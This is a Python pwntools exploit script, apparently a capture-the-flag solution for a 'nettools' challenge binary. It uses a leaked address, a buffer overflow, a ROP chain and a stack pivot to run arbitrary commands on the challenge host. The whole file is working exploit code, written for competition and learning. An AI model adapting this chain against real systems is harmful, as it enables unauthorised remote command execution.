#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import sys

from pwn import *

elf = context.binary = ELF("./nettools", checksec=False)
# context.log_level = "CRITICAL"


def start(argv=[], *a, **kw):
    nc = "nc chals.sekai.team 4001"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {"RUST_BACKTRACE": "full"}
io = start()

io.recvuntil(b"is leaked: 0x")
pie_leak = int(io.recvline(keepends=False), 16)
elf.address = pie_leak - 0x7a03c
log.info(f"{elf.address=:#x}")


def rebase(offset):
    return elf.address + offset


nettools_ping = rebase(0xc900)
nettools_ip_lookup = rebase(0xd480)
nettools_read = rebase(0xc5c0)
command_new = rebase(0x10bc0)
command_output = rebase(0x3aeb0)
command_arg = rebase(0x10ab0)

mov_rdx_rsi = rebase(0x0005f2cd)
pop_rdi = rebase(0x0005f373)
pop_rsi_r15 = rebase(0x0005f371)
pop_rbp = rebase(0x0005d67d)
pop_rsp_r14_r15 = rebase(0x0005b7e0)
mov_rdi_rax = rebase(0x0005f1f7)
mov_rdi_rax_jmp_rcx = rebase(0x0005ed1b)
ret = rebase(0x0000af46)
pop_rcx = rebase(0x0005f0d8)

new_stack = elf.bss(0x600)

payload = b"localhost"
payload = payload.ljust(0x2e8, b"\x00")
payload += flat(
    pop_rdi, new_stack,
    pop_rsi_r15, 0x800, 0,
    mov_rdx_rsi,
)
payload += p64(nettools_read)
payload += flat(
    pop_rsp_r14_r15,
    new_stack + 0x100,
)
log.info(f"{new_stack=:#x}")
# pause()
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Hostname: ", payload)
# pause(1)

# Can only run command with one argument
c = sys.argv[1].encode()
args = [sys.argv[2].encode()]
# args = [b"-al", b"/home"]
argc = len(args)
cmd = c + b"".join(args)

payload = b""
payload += b"\x00" * 0x100
payload += flat(0, 0)  # r14, r15

# payload += flat(
#     pop_rdi, new_stack + 0x3b8,
#     pop_rsi_r15, len(c), 0,
#     mov_rdx_rsi,
#     pop_rsi_r15, new_stack + 0x280, 0,
#     command_new,
#     mov_rdi_rax,
#     pop_rsi_r15, len(arg), 0,
#     mov_rdx_rsi,
#     pop_rsi_r15, new_stack + 0x280 + len(c), 0,
#     ret,
#     command_arg,
#     nettools_ping + 1040,
# )

payload += flat(
    pop_rdi, new_stack + 0x3b8 + 0x40 * (argc - 1),  # + 0x10,
    pop_rsi_r15, len(c), 0,
    mov_rdx_rsi,
    pop_rsi_r15, new_stack + 0x280, 0,
    command_new,
)

for i in range(argc):
    payload += flat(pop_rcx,
                    pop_rsi_r15,
                    mov_rdi_rax_jmp_rcx,
                    len(args[i]),
                    0,
                    mov_rdx_rsi,
                    pop_rsi_r15,
                    new_stack + 0x280 + len(c + b"".join(args[:i])),
                    0,
                    command_arg,
                    )

payload += p64(nettools_ping + 1040)
payload = payload.ljust(0x280, b"A")
payload += cmd

io.sendlineafter(b"::1]\n", payload)
io.interactive()

# with open("libc.so.6", "wb") as f:
#     out = io.recvall()
#     f.write(out)

# io.close()
